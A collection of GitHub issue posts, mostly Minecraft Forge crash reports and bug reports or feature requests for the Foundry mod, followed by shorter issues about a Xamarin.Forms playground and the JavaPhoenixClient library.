	| LCHIJ | foamfix                                      | 0.10.5-1.12.2     | foamfix-0.10.5-1.12.2.jar                          | None                                     |
	| LCHIJ | waila                                        | 1.8.26            | Hwyla-1.8.26-B41_1.12.2.jar                        | None                                     |
	| LCHIJ | immersivecables                              | 1.3.2             | ImmersiveCables-1.12.2-1.3.2.jar                   | None                                     |
	| LCHIJ | immersivepetroleum                           | 1.1.9             | immersivepetroleum-1.12.2-1.1.9.jar                | None                                     |
	| LCHIJ | immersiveposts                               | 0.1.2             | ImmersivePosts-0.1.2.jar                           | 0ba25d8c0ec23537afc6db926e1ea764335a33b1 |
	| LCHIJ | immersivetech                                | 1.3.10            | immersivetech-1.12-1.3.10.jar                      | None                                     |
	| LCHIJ | journeymap                                   | 1.12.2-5.5.4      | journeymap-1.12.2-5.5.4.jar                        | None                                     |
	| LCHIJ | justenoughpetroleum                          | 0.1               | JustEnoughPetroleum-0.1.jar                        | None                                     |
	| LCHIJ | magneticraft                                 | 3.4.5             | Magneticraft_1.12-2.6.5-dev.jar                    | None                                     |
	| LCHIJ | mtrm                                         | 1.2.2.30          | MineTweakerRecipeMaker-1.12.2-1.2.2.30.jar         | None                                     |
	| LCHIJ | modelloader                                  | 1.1.6             | modelloader-1.1.6.jar                              | None                                     |
	| LCHIJ | modularmachinery                             | 1.10.0            | modularmachinery-1.12.2-1.10.0.jar                 | a0f0b759d895c15ceb3e3bcb5f3c2db7c582edf0 |
	| LCHIJ | norecipebook                                 | 1.2.1             | noRecipeBook_v1.2.2formc1.12.2.jar                 | None                                     |
	| LCHIJ | placebo                                      | 1.6.0             | Placebo-1.12.2-1.6.0.jar                           | None                                     |
	| LCHIJ | pneumaticcraft                               | 1.12.2-0.11.3-366 | pneumaticcraft-repressurized-1.12.2-0.11.3-366.jar | None                                     |
	| LCHIJ | resourceloader                               | 1.5.3             | ResourceLoader-MC1.12.1-1.5.3.jar                  | d72e0dd57935b3e9476212aea0c0df352dd76291 |
	| LCHIJ | tfc                                          | ${version}        | TerraFirmaCraft-MC1.12.2-0.10.0.48.jar             | None                                     |
	| LCHIJ | toastcontrol                                 | 1.8.1             | Toast+Control-1.12.2-1.8.1.jar                     | None                                     |
	| LCHIJ | watercontrolextreme                          | 1.0.0             | WaterControlExtreme-1.0.2.jar                      | None                                     |
	| LCHIJ | wearablebackpacks                            | 3.1.3             | WearableBackpacks-1.12.2-3.1.3.jar                 | None                                     |
	| LCHIE | foundry                                      | 1.7.12            | ZenFoundry-1.7.12.jar                              | None                                     |
	| LCHI  | orelib                                       | 3.5.2.2           | OreLib-1.12.2-3.5.2.2.jar                          | 7a2128d395ad96ceb9d9030fbd41d035b435753a |
	| LCHI  | techreborn_compat                            | 1.0.0             | TechReborn-ModCompatibility-1.12.2-1.1.0.38.jar    | 8727a3141c8ec7f173b87aa78b9b9807867c4e6b |

	Loaded coremods (and transformers): 
ForgelinPlugin (Forgelin-1.8.3.jar)
  
IELoadingPlugin (ImmersiveEngineering-core-0.12-89.jar)
  blusunrize.immersiveengineering.common.asm.IEClassTransformer
Do not report to Forge! (If you haven't disabled the FoamFix coremod, try disabling it in the config! Note that this bit of text will still appear.) (foamfix-0.10.5-1.12.2.jar)
  pl.asie.foamfix.coremod.FoamFixTransformer
LoadingPlugin (ResourceLoader-MC1.12.1-1.5.3.jar)
  lumien.resourceloader.asm.ClassTransformer
BetterFoliageLoader (BetterFoliage-MC1.12-2.2.0.jar)
  mods.betterfoliage.loader.BetterFoliageTransformer
MovingWorldCore (movingworld-1.12-6.342-full.jar)
  
CTMCorePlugin (CTM-MC1.12.2-0.3.3.22.jar)
  team.chisel.ctm.client.asm.CTMTransformer
LoadingPlugin (BetterWithLib-1.12-1.5.jar)
  betterwithmods.library.core.ClassTransformer
	GL info: ' Vendor: 'NVIDIA Corporation' Version: '4.6.0 NVIDIA 430.86' Renderer: 'GeForce GTX 1060 6GB/PCIe/SSE2'
	TerraFirmaCraft: You are not running an official build. Please do not use this and then report bugs or issues.
	RebornCore: 
		Plugin Engine: 0
		RebornCore Version: 3.13.12.447
		Runtime Debofucsation 1
		RenderEngine: 0 So, Im trying to add/change the fluid fuels for the heater and Im getting an error looking for **Definition** instead of **Stack**

At least, I have no idea how to use Definition, yet.
Here is the script
`FluidHeater.addFuel(<liquid:lava>, 210000);`
(I imported the mods.foundry.* stuff)

Usually this works for most mods that use liquids, but this one asks for definitions, and Im currently reading about what exactly that is.

oh and here is the error, giving me the exact issue

> addFuel(ZenTypeNative: crafttweaker.liquid.ILiquidDefinition, int)
> addFuel(ZenTypeNative: crafttweaker.liquid.ILiquidDefinition) ---- Minecraft Crash Report ----

WARNING: coremods are present:
  ForgelinPlugin (Forgelin-1.8.3.jar)
  IELoadingPlugin (ImmersiveEngineering-core-0.12-89.jar)
  Do not report to Forge! (If you haven't disabled the FoamFix coremod, try disabling it in the config! Note that this bit of text will still appear.) (foamfix-0.10.5-1.12.2.jar)
  LoadingPlugin (ResourceLoader-MC1.12.1-1.5.3.jar)
  BetterFoliageLoader (BetterFoliage-MC1.12-2.2.0.jar)
  MovingWorldCore (movingworld-1.12-6.342-full.jar)
  CTMCorePlugin (CTM-MC1.12.2-0.3.3.22.jar)
  LoadingPlugin (BetterWithLib-1.12-1.5.jar)
Contact their authors BEFORE contacting forge

// I'm sorry, Dave.

Time: 7/9/19 6:49 PM
Description: There was a severe problem during mod loading that has caused the game to fail

net.minecraftforge.fml.common.LoaderExceptionModCrash: Caught exception from Zen: Foundry (foundry)
Caused by: java.lang.ArrayIndexOutOfBoundsException: 32767
	at net.dries007.tfc.objects.Gem$Grade.fromMeta(Gem.java:34)
	at net.dries007.tfc.objects.items.ItemGem.getGradeFromStack(ItemGem.java:57)
	at net.dries007.tfc.objects.items.ItemGem.func_77667_c(ItemGem.java:63)
	at net.minecraft.item.ItemStack.func_77977_a(ItemStack.java:509)
	at exter.foundry.util.hashstack.HashableItem.hashCode(HashableItem.java:76)
	at java.util.HashMap.hash(Unknown Source)
	at java.util.HashMap.put(Unknown Source)
	at exter.foundry.material.MaterialRegistry.registerItem(MaterialRegistry.java:86)
	at exter.foundry.init.InitRecipes.postInit(InitRecipes.java:56)
	at exter.foundry.Foundry.postInit(Foundry.java:127)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at net.minecraftforge.fml.common.FMLModContainer.handleModStateEvent(FMLModContainer.java:637)
	at sun.reflect.GeneratedMethodAccessor8.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at com.google.common.eventbus.Subscriber.invokeSubscriberMethod(Subscriber.java:91)
	at com.google.common.eventbus.Subscriber$SynchronizedSubscriber.invokeSubscriberMethod(Subscriber.java:150)
	at com.google.common.eventbus.Subscriber$1.run(Subscriber.java:76)
	at com.google.common.util.concurrent.MoreExecutors$DirectExecutor.execute(MoreExecutors.java:399)
	at com.google.common.eventbus.Subscriber.dispatchEvent(Subscriber.java:71)
	at com.google.common.eventbus.Dispatcher$PerThreadQueuedDispatcher.dispatch(Dispatcher.java:116)
	at com.google.common.eventbus.EventBus.post(EventBus.java:217)
	at net.minecraftforge.fml.common.LoadController.sendEventToModContainer(LoadController.java:219)
	at net.minecraftforge.fml.common.LoadController.propogateStateMessage(LoadController.java:197)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at com.google.common.eventbus.Subscriber.invokeSubscriberMethod(Subscriber.java:91)
	at com.google.common.eventbus.Subscriber$SynchronizedSubscriber.invokeSubscriberMethod(Subscriber.java:150)
	at com.google.common.eventbus.Subscriber$1.run(Subscriber.java:76)
	at com.google.common.util.concurrent.MoreExecutors$DirectExecutor.execute(MoreExecutors.java:399)
	at com.google.common.eventbus.Subscriber.dispatchEvent(Subscriber.java:71)
	at com.google.common.eventbus.Dispatcher$PerThreadQueuedDispatcher.dispatch(Dispatcher.java:116)
	at com.google.common.eventbus.EventBus.post(EventBus.java:217)
	at net.minecraftforge.fml.common.LoadController.distributeStateMessage(LoadController.java:136)
	at net.minecraftforge.fml.common.Loader.initializeMods(Loader.java:749)
	at net.minecraftforge.fml.client.FMLClientHandler.finishMinecraftLoading(FMLClientHandler.java:336)
	at net.minecraft.client.Minecraft.func_71384_a(Minecraft.java:535)
	at net.minecraft.client.Minecraft.func_99999_d(Minecraft.java:378)
	at net.minecraft.client.main.Main.main(SourceFile:123)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at net.minecraft.launchwrapper.Launch.launch(Launch.java:135)
	at net.minecraft.launchwrapper.Launch.main(Launch.java:28)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.multimc.onesix.OneSixLauncher.launchWithMainClass(OneSixLauncher.java:196)
	at org.multimc.onesix.OneSixLauncher.launch(OneSixLauncher.java:231)
	at org.multimc.EntryPoint.listen(EntryPoint.java:143)
	at org.multimc.EntryPoint.main(EntryPoint.java:34)


A detailed walkthrough of the error, its code path and all known details is as follows:
---------------------------------------------------------------------------------------

-- System Details --
Details:
	Minecraft Version: 1.12.2
	Operating System: Windows 10 (amd64) version 10.0
	Java Version: 1.8.0_211, Oracle Corporation
	Java VM Version: Java HotSpot(TM) 64-Bit Server VM (mixed mode), Oracle Corporation
	Memory: 724631672 bytes (691 MB) / 2286419968 bytes (2180 MB) up to 3817865216 bytes (3641 MB)
	JVM Flags: 3 total; -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump -Xms512m -Xmx4096m
	IntCache: cache: 0, tcache: 0, allocated: 0, tallocated: 0
	FML: MCP 9.42 Powered by Forge 14.23.5.2838 61 mods loaded, 61 mods active
	States: 'U' = Unloaded 'L' = Loaded 'C' = Constructed 'H' = Pre-initialized 'I' = Initialized 'J' = Post-initialized 'A' = Available 'D' = Disabled 'E' = Errored

	| State | ID                                           | Version           | Source                                             | Signature                                |
	|:----- |:-------------------------------------------- |:----------------- |:-------------------------------------------------- |:---------------------------------------- |
	| LCHIJ | minecraft                                    | 1.12.2            | minecraft.jar                                      | None                                     |
	| LCHIJ | mcp                                          | 9.42              | minecraft.jar                                      | None                                     |
	| LCHIJ | FML                                          | 8.0.99.99         | forge-1.12.2-14.23.5.2838-universal.jar            | e3c3d50c7c986df74c645c0ac54639741c90a557 |
	| LCHIJ | forge                                        | 14.23.5.2838      | forge-1.12.2-14.23.5.2838-universal.jar            | e3c3d50c7c986df74c645c0ac54639741c90a557 |
	| LCHIJ | com.elytradev.movingworld.common.asm.coremod |                   | minecraft.jar                                      | None                                     |
	| LCHIJ | foamfixcore                                  | 7.7.4             | minecraft.jar                                      | None                                     |
	| LCHIJ | engineersdecor                               | 1.0.8             | engineersdecor-1.12.2-1.0.8.jar                    | ed58ed655893ced6280650866985abcae2bf7559 |
	| LCHIJ | crafttweaker                                 | 4.1.19            | CraftTweaker2-1.12-4.1.19.jar                      | None                                     |
	| LCHIJ | mtlib                                        | 3.0.6             | MTLib-3.0.6.jar                                    | None                                     |
	| LCHIJ | modtweaker                                   | 4.0.17            | modtweaker-4.0.17.jar                              | None                                     |
	| LCHIJ | jei                                          | 4.15.0.268        | jei_1.12.2-4.15.0.268.jar                          | None                                     |
	| LCHIJ | railcraft                                    | 12.0.0            | railcraft-12.0.0.jar                               | a0c255ac501b2749537d5824bb0f0588bf0320fa |
	| LCHIJ | redstoneflux                                 | 2.1.0             | RedstoneFlux-1.12-2.1.0.6-universal.jar            | 8a6abf2cb9e141b866580d369ba6548732eff25f |
	| LCHIJ | cofhcore                                     | 4.6.3             | CoFHCore-1.12.2-4.6.3.27-universal.jar             | None                                     |
	| LCHIJ | cofhworld                                    | 1.3.1             | CoFHWorld-1.12.2-1.3.1.7-universal.jar             | 8a6abf2cb9e141b866580d369ba6548732eff25f |
	| LCHIJ | thermalfoundation                            | 2.6.3             | ThermalFoundation-1.12.2-2.6.3.27-universal.jar    | 8a6abf2cb9e141b866580d369ba6548732eff25f |
	| LCHIJ | immersiveengineering                         | 0.12-89           | ImmersiveEngineering-0.12-89.jar                   | 4cb49fcde3b43048c9889e0a3d083225da926334 |
	| LCHIJ | alternatingflux                              | 0.12.2-2          | alternatingflux-0.12.2-2.jar                       | None                                     |
	| LCHIJ | astikorcarts                                 | 1.12.2-0.1.2.7    | astikorcarts-1.12.2-0.1.2.7.jar                    | None                                     |
	| LCHIJ | base                                         | 3.13.0            | base-1.12.2-3.13.0.jar                             | None                                     |
	| LCHIJ | forgelin                                     | 1.8.3             | Forgelin-1.8.3.jar                                 | None                                     |
	| LCHIJ | betterfoliage                                | 2.2.0             | BetterFoliage-MC1.12-2.2.0.jar                     | None                                     |
	| LCHIJ | betterstorage                                | 3.0.0.2           | BetterStorageToo-1.12.2-3.0.0.2.jar                | None                                     |
	| LCHIJ | betterwithlib                                | ${version}        | BetterWithLib-1.12-1.5.jar                         | None                                     |
	| LCHIJ | ctm                                          | MC1.12.2-0.3.3.22 | CTM-MC1.12.2-0.3.3.22.jar                          | None                                     |
	| LCHIJ | reborncore                                   | 3.13.12.447       | RebornCore-1.12.2-3.13.12.447-universal.jar        | 8727a3141c8ec7f173b87aa78b9b9807867c4e6b |
	| LCHIJ | techreborn                                   | 2.22.1.979        | TechReborn-1.12.2-2.22.1.979-universal.jar         | 8727a3141c8ec7f173b87aa78b9b9807867c4e6b |
	| LCHIJ | betterwithmods                               | 1.12-2.3.20-1027  | BetterWithMods-1.12-2.3.20-1027.jar                | None                                     |
	| LCHIJ | ceramics                                     | 1.12-1.3.7        | Ceramics-1.12-1.3.7.jar                            | None                                     |
	| LCHIJ | contenttweaker                               | 1.12.2-4.9.1      | ContentTweaker-1.12.2-4.9.1.jar                    | None                                     |
	| LCHIJ | cosmeticarmorreworked                        | 1.12.2-v4a        | CosmeticArmorReworked-1.12.2-v4a.jar               | aaaf83332a11df02406e9f266b1b65c1306f0f76 |
	| LCHIJ | ctgui                                        | 1.0.0             | CraftTweaker2-1.12-4.1.19.jar                      | None                                     |
	| LCHIJ | crafttweakerjei                              | 2.0.3             | CraftTweaker2-1.12-4.1.19.jar                      | None                                     |
	| LCHIJ | movingworld                                  | 1.12-6.342        | movingworld-1.12-6.342-full.jar                    | None                                     |
	| LCHIJ | davincisvessels                              | @DVESSELSVER@     | davincisvessels-1.12-6.340-full.jar                | None                                     |
	| LCHIJ | earthworks                                   | 1.3.4.3           | Earthworks-1.12-1.3.6.jar                          | None                                     |
	| LCHIJ | engineersdoors                               | 0.8.0             | engineers_doors-1.12.2-0.8.0.jar                   | None                                     |
	| LCHIJ | finite-water-control                         | 1.0               | finite-water-control-1.12-1.0.jar                  | None                                     |
	| LCHIJ | foamfix                                      | 0.10.5-1.12.2     | foamfix-0.10.5-1.12.2.jar                          | None                                     |
	| LCHIJ | waila                                        | 1.8.26            | Hwyla-1.8.26-B41_1.12.2.jar                        | None                                     |
	| LCHIJ | immersivecables                              | 1.3.2             | ImmersiveCables-1.12.2-1.3.2.jar                   | None                                     |
	| LCHIJ | immersivepetroleum                           | 1.1.9             | immersivepetroleum-1.12.2-1.1.9.jar                | None                                     |
	| LCHIJ | immersiveposts                               | 0.1.2             | ImmersivePosts-0.1.2.jar                           | 0ba25d8c0ec23537afc6db926e1ea764335a33b1 |
	| LCHIJ | immersivetech                                | 1.3.10            | immersivetech-1.12-1.3.10.jar                      | None                                     |
	| LCHIJ | journeymap                                   | 1.12.2-5.5.4      | journeymap-1.12.2-5.5.4.jar                        | None                                     |
	| LCHIJ | justenoughpetroleum                          | 0.1               | JustEnoughPetroleum-0.1.jar                        | None                                     |
	| LCHIJ | magneticraft                                 | 3.4.5             | Magneticraft_1.12-2.6.5-dev.jar                    | None                                     |
	| LCHIJ | mtrm                                         | 1.2.2.30          | MineTweakerRecipeMaker-1.12.2-1.2.2.30.jar         | None                                     |
	| LCHIJ | modelloader                                  | 1.1.6             | modelloader-1.1.6.jar                              | None                                     |
	| LCHIJ | modularmachinery                             | 1.10.0            | modularmachinery-1.12.2-1.10.0.jar                 | a0f0b759d895c15ceb3e3bcb5f3c2db7c582edf0 |
	| LCHIJ | norecipebook                                 | 1.2.1             | noRecipeBook_v1.2.2formc1.12.2.jar                 | None                                     |
	| LCHIJ | placebo                                      | 1.6.0             | Placebo-1.12.2-1.6.0.jar                           | None                                     |
	| LCHIJ | pneumaticcraft                               | 1.12.2-0.11.3-366 | pneumaticcraft-repressurized-1.12.2-0.11.3-366.jar | None                                     |
	| LCHIJ | resourceloader                               | 1.5.3             | ResourceLoader-MC1.12.1-1.5.3.jar                  | d72e0dd57935b3e9476212aea0c0df352dd76291 |
	| LCHIJ | tfc                                          | ${version}        | TerraFirmaCraft-MC1.12.2-0.10.0.48.jar             | None                                     |
	| LCHIJ | toastcontrol                                 | 1.8.1             | Toast+Control-1.12.2-1.8.1.jar                     | None                                     |
	| LCHIJ | watercontrolextreme                          | 1.0.0             | WaterControlExtreme-1.0.2.jar                      | None                                     |
	| LCHIJ | wearablebackpacks                            | 3.1.3             | WearableBackpacks-1.12.2-3.1.3.jar                 | None                                     |
	| LCHIE | foundry                                      | 1.7.12            | ZenFoundry-1.7.12.jar                              | None                                     |
	| LCHI  | orelib                                       | 3.5.2.2           | OreLib-1.12.2-3.5.2.2.jar                          | 7a2128d395ad96ceb9d9030fbd41d035b435753a |
	| LCHI  | techreborn_compat                            | 1.0.0             | TechReborn-ModCompatibility-1.12.2-1.1.0.38.jar    | 8727a3141c8ec7f173b87aa78b9b9807867c4e6b |

	Loaded coremods (and transformers): 
ForgelinPlugin (Forgelin-1.8.3.jar)
  
IELoadingPlugin (ImmersiveEngineering-core-0.12-89.jar)
  blusunrize.immersiveengineering.common.asm.IEClassTransformer
Do not report to Forge! (If you haven't disabled the FoamFix coremod, try disabling it in the config! Note that this bit of text will still appear.) (foamfix-0.10.5-1.12.2.jar)
  pl.asie.foamfix.coremod.FoamFixTransformer
LoadingPlugin (ResourceLoader-MC1.12.1-1.5.3.jar)
  lumien.resourceloader.asm.ClassTransformer
BetterFoliageLoader (BetterFoliage-MC1.12-2.2.0.jar)
  mods.betterfoliage.loader.BetterFoliageTransformer
MovingWorldCore (movingworld-1.12-6.342-full.jar)
  
CTMCorePlugin (CTM-MC1.12.2-0.3.3.22.jar)
  team.chisel.ctm.client.asm.CTMTransformer
LoadingPlugin (BetterWithLib-1.12-1.5.jar)
  betterwithmods.library.core.ClassTransformer
	GL info: ' Vendor: 'NVIDIA Corporation' Version: '4.6.0 NVIDIA 430.86' Renderer: 'GeForce GTX 1060 6GB/PCIe/SSE2'
	TerraFirmaCraft: You are not running an official build. Please do not use this and then report bugs or issues.
	RebornCore: 
		Plugin Engine: 0
		RebornCore Version: 3.13.12.447
		Runtime Debofucsation 1
		RenderEngine: 0 As the title states, would love to be able to use this mod to create metal tool parts from Adventurers Toolbox. # Heyo
Saw this in the log. thought you would want to see it.
### Version
- Minecraft 1.12.2
- Foundry 1.7.7
- JEI 4.14.4.259
### Issue
```
[Client thread/ERROR] [jei]: Failed to register mod categories: class exter.foundry.integration.jei.JEIFoundryPlugin
java.lang.NoSuchFieldError: RECIPE_BACKGROUND
	at exter.foundry.integration.jei.FluidHeaterJEI$Category.<init>(FluidHeaterJEI.java:35) ~[FluidHeaterJEI$Category.class:?]
	at exter.foundry.integration.jei.JEIFoundryPlugin.registerCategories(JEIFoundryPlugin.java:130) ~[JEIFoundryPlugin.class:?]
	at mezz.jei.startup.JeiStarter.registerCategories(JeiStarter.java:180) [JeiStarter.class:?]
	at mezz.jei.startup.JeiStarter.start(JeiStarter.java:69) [JeiStarter.class:?]
	at mezz.jei.startup.ProxyCommonClient.loadComplete(ProxyCommonClient.java:136) [ProxyCommonClient.class:?]
	at mezz.jei.JustEnoughItems.loadComplete(JustEnoughItems.java:55) [JustEnoughItems.class:?]
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_11]
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_11]
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_11]
	at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_11]
	at net.minecraftforge.fml.common.FMLModContainer.handleModStateEvent(FMLModContainer.java:624) [FMLModContainer.class:?]
	at sun.reflect.GeneratedMethodAccessor8.invoke(Unknown Source) ~[?:?]
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_11]
	at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_11]
	at com.google.common.eventbus.Subscriber.invokeSubscriberMethod(Subscriber.java:91) [guava-21.0.jar:?]
	at com.google.common.eventbus.Subscriber$SynchronizedSubscriber.invokeSubscriberMethod(Subscriber.java:150) [guava-21.0.jar:?]
	at com.google.common.eventbus.Subscriber$1.run(Subscriber.java:76) [guava-21.0.jar:?]
	at com.google.common.util.concurrent.MoreExecutors$DirectExecutor.execute(MoreExecutors.java:399) [guava-21.0.jar:?]
	at com.google.common.eventbus.Subscriber.dispatchEvent(Subscriber.java:71) [guava-21.0.jar:?]
	at com.google.common.eventbus.Dispatcher$PerThreadQueuedDispatcher.dispatch(Dispatcher.java:116) [guava-21.0.jar:?]
	at com.google.common.eventbus.EventBus.post(EventBus.java:217) [guava-21.0.jar:?]
	at net.minecraftforge.fml.common.LoadController.sendEventToModContainer(LoadController.java:219) [LoadController.class:?]
	at net.minecraftforge.fml.common.LoadController.propogateStateMessage(LoadController.java:197) [LoadController.class:?]
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_11]
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_11]
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_11]
	at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_11]
	at com.google.common.eventbus.Subscriber.invokeSubscriberMethod(Subscriber.java:91) [guava-21.0.jar:?]
	at com.google.common.eventbus.Subscriber$SynchronizedSubscriber.invokeSubscriberMethod(Subscriber.java:150) [guava-21.0.jar:?]
	at com.google.common.eventbus.Subscriber$1.run(Subscriber.java:76) [guava-21.0.jar:?]
	at com.google.common.util.concurrent.MoreExecutors$DirectExecutor.execute(MoreExecutors.java:399) [guava-21.0.jar:?]
	at com.google.common.eventbus.Subscriber.dispatchEvent(Subscriber.java:71) [guava-21.0.jar:?]
	at com.google.common.eventbus.Dispatcher$PerThreadQueuedDispatcher.dispatch(Dispatcher.java:116) [guava-21.0.jar:?]
	at com.google.common.eventbus.EventBus.post(EventBus.java:217) [guava-21.0.jar:?]
	at net.minecraftforge.fml.common.LoadController.distributeStateMessage(LoadController.java:136) [LoadController.class:?]
	at net.minecraftforge.fml.common.Loader.initializeMods(Loader.java:752) [Loader.class:?]
	at net.minecraftforge.fml.client.FMLClientHandler.finishMinecraftLoading(FMLClientHandler.java:336) [FMLClientHandler.class:?]
	at net.minecraft.client.Minecraft.func_71384_a(Minecraft.java:535) [bib.class:?]
	at net.minecraft.client.Minecraft.func_99999_d(Minecraft.java:378) [bib.class:?]
	at net.minecraft.client.main.Main.main(SourceFile:123) [Main.class:?]
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_11]
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_11]
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_11]
	at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_11]
	at net.minecraft.launchwrapper.Launch.launch(Launch.java:135) [launchwrapper-1.12.jar:?]
	at net.minecraft.launchwrapper.Launch.main(Launch.java:28) [launchwrapper-1.12.jar:?]
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_11]
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_11]
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_11]
	at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_11]
	at org.multimc.onesix.OneSixLauncher.launchWithMainClass(OneSixLauncher.java:196) [NewLaunch.jar:?]
	at org.multimc.onesix.OneSixLauncher.launch(OneSixLauncher.java:231) [NewLaunch.jar:?]
	at org.multimc.EntryPoint.listen(EntryPoint.java:143) [NewLaunch.jar:?]
	at org.multimc.EntryPoint.main(EntryPoint.java:34) [NewLaunch.jar:?]
``` While flipping through the recipes, I realized that every molten metal that embers takes over (Iron, Gold, Bronze, etc) messes up all related melting recipes, in the way that Iron melts at 900, Bronze melts at 900, gold melts at 900, etc.
Even stuff like Armor and Tools, all melt at 900.
Im gonna try some Unidict, JAOPCA, and Foundry "Mod Priorities" stuff and see what takes, if at all. How much power does the Induction heater take to work anyway? I've got two basic steam dynamos (max 80 rf/t) running into one and it only gets a Standard Melting Crucible up to 532K. Compared to a Burner Heater with a single Block of Coal hitting 1950+K, that seems a bit ridiculous since that same block of coal makes about 240,000 RF in a steam dynamo and RF should be more efficient than solid fuel even in its basic production form. Base Metals, Modern Metals, and Base Minerals all add numerous ores and armor/blocks/tools made from those ores. It would be awesome to see some casting support for these items. Version 1.7.4

Whenever I place a ceramic bucket of any molten material in any of the crucibles, the material is deposited in the crucible but the bucket is consumed. I tried this with the vanilla bucket, and an empty bucket is returned in the output slot.

Let me know if this is on your end or ceramics end, so that I can report this accordingly please. It seems that despite having everything in, the Alloy Mixer doesnt seem to mix Thermal Expansion special alloys.
I tried all three of Signalum, Enderium, and Lumium and none of them mix.

Electrum and Constantan works, however.
I too have EMBERS: REKINDLED which overtakes this mod's molten forms for the vanilla metals and some common metals like Silver, Lead and Copper. This may or may not factor in this.
Im going to try a crafttweaked recipe and see if that can bypass this. I see blocks (stairs and such), nuggets, ingots, rods, etc. working properly in the metal caster. However, the tools and armors do not cast.

Further, there are not molten versions for the Base Metals Suite exclusive metals such as Star-Steel and Adamantite which causes none of their casting recipes to work since you can't even melt them. Some casts like the ingot are somewhat easy to guess at the recipe in the mold maker. Others, like the gear, are not. It would be nice to have the option to see the recipes for them in JEI. Instead of doing every metal in crafttweaker, I'd ask for a simple casting speed config. If I recall, everything metal casts at the same speed, depending on cast.

And possibly melting speed, but I guess it is tied to the Temperature.
 Version 1.7.4

Whenever I place a ceramic bucket of any molten material in any of the crucibles, the material is deposited in the crucible but the bucket is consumed. I tried this with the vanilla bucket, and an empty bucket is returned in the output slot.

Let me know if this is on your end or ceramics end, so that I can report this accordingly please.  Some molds like the ingot are somewhat easy to guess at the recipe in the mold maker. Others, like the gear, are not. It would be nice to have the option to see the recipes for them in JEI.
<---------->
140599088
Hi,
Visual feature not compatible with **Android 5.x** can you confirm this? 
I tested it only for the Entry element
Actual results:
![player_2019-03-14_09-42-05](https://user-images.githubusercontent.com/10366325/54342673-600e2580-463d-11e9-8cc2-1d07fbd7d5dd.png)

Thank you Gesture swiping on android does not work in shell. (Still works in iOS)

See 3.2 Green box.

Also tried in new shell project. Xamarin.Forms 4.0 has been released, is there a litter things playground about that? Hi there!
SwitchCell OnColor = "..." on page ThreeFivePage, always pink when on. Any ideas when work will start on the UWP platform for this and shell?  We develop for the tablet and UWP is a large portion of our customers currently
<---------->
140852184
When serializing Payload objects, the default JSON behaviour is to convert from camel case to snake case: https://github.com/dsrees/JavaPhoenixClient/blob/master/src/main/kotlin/org/phoenixframework/Defaults.kt#L52

I presume it was done deliberately for internal reasons, but it is a bit of a surprise.

I don't think this is what the equivalent Javascript library does: https://github.com/phoenixframework/phoenix/blob/master/assets/js/phoenix.js#L648 Hi @dsrees 
I wanted to update the library but I see that a lot has changed. 

Could you provide a bit more information about reconnection strategy?

The reason I'm asking this is that I do have my own reconnection strategy for WS errors and know it would be duplicated with the one provided from the library. 
I do see that you do retry only for specific errors and I'm wondering if it would be possible to maybe implement this is a bit more configurable way? So we could choose the strategy like only for errors or when the WS was closed or both. Does it make sense?  Received this a couple of times. client version 0.2.5
```
Fatal Exception: java.util.ConcurrentModificationException
       at java.util.ArrayList$Itr.next(ArrayList.java:860)
       at org.phoenixframework.Socket.triggerChannelError(Socket.kt:467)
       at org.phoenixframework.Socket.onConnectionError$JavaPhoenixClient(Socket.kt:458)
       at org.phoenixframework.Socket$connect$3.invoke(Socket.kt:229)
       at org.phoenixframework.Socket$connect$3.invoke(Socket.kt:66)
       at org.phoenixframework.WebSocketTransport.onFailure(Transport.kt:134)
       at okhttp3.internal.ws.RealWebSocket.failWebSocket(RealWebSocket.java:571)
       at okhttp3.internal.ws.RealWebSocket$1.onFailure(RealWebSocket.java:221)
       at okhttp3.RealCall$AsyncCall.execute(RealCall.java:225)
       at okhttp3.internal.NamedRunnable.run(NamedRunnable.java:32)
       at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
